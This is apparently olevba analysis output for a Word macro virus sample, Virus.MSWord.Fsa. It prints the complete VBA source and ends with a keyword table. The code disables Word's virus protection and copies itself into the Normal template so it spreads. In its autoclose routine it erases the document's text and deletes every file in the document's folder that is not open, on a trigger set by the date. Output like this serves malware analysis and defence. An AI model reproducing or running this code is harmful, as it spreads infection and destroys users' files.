olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fsa-5804cfd81ab75a6f0317363d0ee69b8827bb3650
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fsa-5804cfd81ab75a6f0317363d0ee69b8827bb3650 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO hello.bas 
in file: Virus.MSWord.Fsa-5804cfd81ab75a6f0317363d0ee69b8827bb3650 - OLE stream: 'Macros/VBA/hello'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.autoopen.autoopen"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
 RecentFiles.Maximum = 0
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "hello" Then
        myflag = -1
    End If
Next i
If Not myflag Then

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
End If
k = ActiveDocument.FullName
iMacroCount = Application.ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If Application.ActiveDocument.VBProject.VBComponents(i).Name = "hello" Then
ActiveDocument.SaveAs FileName:="c:\temp.dot", FileFormat:=wdFormatTemplate
Application.ActiveDocument.SaveAs FileName:=k
End If
Next i
Application.ActiveDocument.SaveAs FileName:=k
Application.OrganizerCopy Source:="c:\temp.dot", Destination:=ActiveDocument.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
Application.ActiveDocument.SaveAs FileName:=k
ErrorAO:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
Sub filesave()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
 RecentFiles.Maximum = 0
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "hello" Then
        myflag = -1
    End If
Next i
If Not myflag Then

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
End If
k = ActiveDocument.FullName
iMacroCount = Application.ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If Application.ActiveDocument.VBProject.VBComponents(i).Name = "hello" Then
ActiveDocument.SaveAs FileName:="c:\temp.dot", FileFormat:=wdFormatTemplate
ActiveDocument.SaveAs FileName:=k
End If
Next i
Application.ActiveDocument.Save
Application.OrganizerCopy Source:="c:\temp.dot", Destination:=ActiveDocument.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
Application.ActiveDocument.Save
ErrorAO:
End Sub

Sub autoclose()
dt$ = Date
dt$ = Left(dt$, 2)
If dt$ = "05" Then
ActiveDocument.Save
ActiveDocument.Select
Selection.Delete
Selection.TypeText TEXT:="hello :))),"
ActiveDocument.Save
k$ = ActiveDocument.FullName
s$ = ActiveDocument.Name
n = Len(s$)
n1 = Len(k$)
n2 = n1 - n
k$ = Left(k$, n2)
myflag = True
On Error GoTo ErrorAO
myfile = Dir(k$ + "*.*")
Do While myfile <> ""
If myflag = True Then GoTo 1
ErrorAO:
myfile = Dir
1:
myflag = False
flag = False
For i = 1 To Application.Documents.Count
If myfile = Application.Documents(i).Name Then
flag = True
End If
Next i
If flag = False Then
Kill k$ + myfile
End If
Loop
End If

End Sub
Sub FileSaveAs()

On Error GoTo ErrorFSA

    Dialogs(wdDialogFileSaveAs).Show
k$ = ActiveDocument.FullName

n = Len(k$)
n = n - 3
k$ = Left(k$, n)
k$ = k$ & "doc"
ActiveDocument.SaveAs FileName:=k$
k$ = Left(k$, n)
k$ = k$ & "dot"
Kill k$
ErrorFSA:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

